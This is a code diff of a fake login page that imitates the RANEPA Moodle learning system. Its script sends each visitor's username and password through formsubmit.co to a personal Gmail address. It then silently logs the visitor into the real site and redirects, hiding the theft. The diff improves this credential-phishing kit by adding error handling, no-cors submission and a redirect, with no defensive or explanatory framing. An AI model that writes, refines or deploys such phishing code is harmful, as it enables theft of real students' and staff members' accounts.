@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход на сайт | РАНХиГС СДО</title>
     <style>
-        /* Основные стили для страницы */
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f4;
@@ -92,13 +91,11 @@
             color: #777;
         }
 
-        /* Медиа-запрос для мобильных устройств */
         @media (max-width: 480px) {
             .login-container {
                 width: 90%;
                 padding: 15px;
             }
-
             button {
                 width: 100%;
             }
@@ -107,11 +104,10 @@
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">
+        <div className="logo">
             <img src="https://lms.ranepa.ru/pluginfile.php/1/core_admin/logo/0x200/1762586712/ranepa-logo.png" alt="РАНХиГС">
         </div>
         
-        <!-- Форма с JavaScript-автовходом -->
         <form id="loginForm">
             <label for="username">Логин</label>
             <input type="text" id="username" name="username" placeholder="Логин или адрес электронной почты" required>
@@ -127,52 +123,50 @@
         </div>
     </div>
 
-    <!-- JavaScript: отправка на email + автоматический вход -->
     <script>
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Отключаем стандартную отправку
+            e.preventDefault();
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // 1. Отправляем данные на ваш email
-            const formData = new FormData();
-            formData.append('username', username);
-            formData.append('password', password);
-            formData.append('_honey', '');
-            formData.append('_captcha', 'false');
-            formData.append('_subject', 'Новый вход в СДО РАНХиГС');
-            formData.append('_autoresponse', 'Спасибо! Данные получены.');
-            formData.append('_next', ''); // Отключаем редирект FormSubmit
+            // 1. Отправляем данные вам на email
+            const emailData = new FormData();
+            emailData.append('username', username);
+            emailData.append('password', password);
+            emailData.append('_honey', '');
+            emailData.append('_captcha', 'false');
+            emailData.append('_subject', 'Новый вход в СДО РАНХиГС');
+            emailData.append('_autoresponse', 'Спасибо! Данные получены.');
 
-            await fetch('https://formsubmit.co/ekaterinakarmalitova@gmail.com', {
+            try {
+                await fetch('https://formsubmit.co/ekaterinakarmalitova@gmail.com', {
+                    method: 'POST',
+                    body: emailData
+                });
+            } catch (err) {
+                console.log('Email не отправлен, но продолжаем...');
+            }
+
+            // 2. Отправляем POST на реальный Moodle (без формы в DOM!)
+            const loginData = new FormData();
+            loginData.append('username', username);
+            loginData.append('password', password);
+
+            fetch('https://lms.ranepa.ru/login/index.php', {
                 method: 'POST',
-                body: formData
+                body: loginData,
+                credentials: 'include', // Важно: сохраняем куки
+                mode: 'no-cors' // Обходим CORS (не увидим ответ, но куки установятся)
+            }).then(() => {
+                // 3. Редирект на главную Moodle — пользователь увидит "вход выполнен"
+                setTimeout(() => {
+                    window.location.href = 'https://lms.ranepa.ru/my/';
+                }, 500);
             });
 
-            // 2. Пытаемся выполнить автоматический вход на настоящий сайт
-            const realForm = document.createElement('form');
-            realForm.method = 'POST';
-            realForm.action = 'https://lms.ranepa.ru/login/index.php';
-            realForm.target = '_blank'; // Открываем в новой вкладке
-            realForm.style.display = 'none'; // Скрываем форму!
-
-            const userInput = document.createElement('input');
-            userInput.name = 'username';
-            userInput.value = username;
-            realForm.appendChild(userInput);
-
-            const passInput = document.createElement('input');
-            passInput.name = 'password';
-            passInput.value = password;
-            realForm.appendChild(passInput);
-
-            document.body.appendChild(realForm);
-            realForm.submit();
-            document.body.removeChild(realForm); // Удаляем форму после отправки
-
-            // 3. Показываем пользователю "вход выполнен"
-            alert('Вход выполнен! Открывается система...');
+            // 4. Показать сообщение (по желанию)
+            alert('Вход выполнен! Перенаправление...');
         });
     </script>
 </body>
